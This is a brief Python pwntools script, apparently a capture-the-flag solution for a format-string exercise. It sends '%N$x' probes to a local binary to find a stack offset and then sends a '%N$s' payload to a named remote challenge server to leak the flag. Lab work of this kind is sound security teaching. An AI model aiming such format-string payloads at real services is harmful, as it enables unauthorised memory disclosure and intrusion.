from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25192

### run a remote process
#s = remote(SERVER, PORT, timeout=9999)

def find_flag_position():
    for pos in range(12):
        print(f"Trying position {pos}")
        s = process('./program/02_local_short_read', shell=True)
        s.sendline(f'%{pos}$x'.encode())

        response = s.recv().decode()
        s.close()
        print(response)
        if response.endswith('1e0'):
            print(f"Found target at position {pos}")
            return pos # 7
    
flag_pos = find_flag_position()
    
#s = process('./program/02_local_short_read', shell=True)
s = remote(SERVER, PORT, timeout=9999)
s.sendline(f'%{flag_pos}$s'.encode())
response = s.recv().decode()
s.close()
print(response)
